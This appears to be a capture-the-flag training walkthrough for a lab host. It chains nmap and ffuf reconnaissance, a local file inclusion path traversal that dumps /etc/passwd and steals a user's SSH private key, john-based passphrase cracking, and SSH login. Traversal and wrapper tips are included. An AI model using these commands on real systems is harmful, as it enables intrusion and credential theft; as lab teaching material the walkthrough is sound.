# Scenario 03 — Web LFI to SSH Private Key

**Difficulty:** 🟡 | **Time:** ~25 min | **Domains:** 02 Scanning, 12 Web Apps, 05 System Hacking
**Tools:** [nmap](../../tools/nmap.md), [ffuf](../../tools/ffuf.md), `curl`, `ssh`, [john](../../tools/john.md)

## Story
Target `10.10.10.22` runs a PHP site vulnerable to LFI. Retrieve `/home/carlos/user.txt`.

## Step 1 — Scan
```bash
nmap -sV -p- -T4 10.10.10.22
```
**Expected finding:** 22/ssh, 80/http Apache.
**→ Tool ref:** [nmap](../../tools/nmap.md#scan-techniques)

## Step 2 — Web content discovery
```bash
ffuf -u http://10.10.10.22/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php
curl -s http://10.10.10.22/
```
**Expected finding:** `index.php?page=home` style URL — parameter-based include.
**→ Tool ref:** [ffuf](../../tools/ffuf.md)

## Step 3 — Test LFI
```bash
curl "http://10.10.10.22/index.php?page=../../../../etc/passwd"
```
**Expected finding:** `/etc/passwd` dumped, notice `carlos:x:1001:1001::/home/carlos:/bin/bash`.

## Step 4 — Steal SSH private key
```bash
curl "http://10.10.10.22/index.php?page=../../../../home/carlos/.ssh/id_rsa" -o carlos.key
chmod 600 carlos.key
cat carlos.key
```
**Expected finding:** `-----BEGIN OPENSSH PRIVATE KEY-----` ... possibly encrypted.

## Step 5 — Crack key passphrase (if encrypted)
```bash
ssh2john carlos.key > carlos.j
john --wordlist=/usr/share/wordlists/rockyou.txt carlos.j
```
**Expected finding:** passphrase recovered.
**→ Tool ref:** [john](../../tools/john.md)

## Step 6 — SSH in and grab flag
```bash
ssh -i carlos.key carlos@10.10.10.22
cat /home/carlos/user.txt
```

## Step 7 — Final answer
**Answer format:** flag string from `user.txt`.

## Gotchas across this chain
- LFI may need `php://filter/convert.base64-encode/resource=` for PHP files — plain include executes them.
- Try `../` depths 3–8; sometimes absolute paths like `/etc/passwd` just work.
- If `id_rsa` is 404, try `authorized_keys` to see usernames, or `.bash_history` for creds.
- `chmod 600` on the stolen key or SSH will refuse it.
- `ssh2john` lives under `/usr/share/john/` on some distros — find with `locate ssh2john`.

## Variant questions this scenario teaches you to handle
- "Read /etc/passwd via LFI" → step 3.
- "How many users on the box?" → step 3 + count UIDs >=1000.
- "Crack this encrypted SSH key" → step 5.
- "Exploit the web app to get user shell" → full chain.
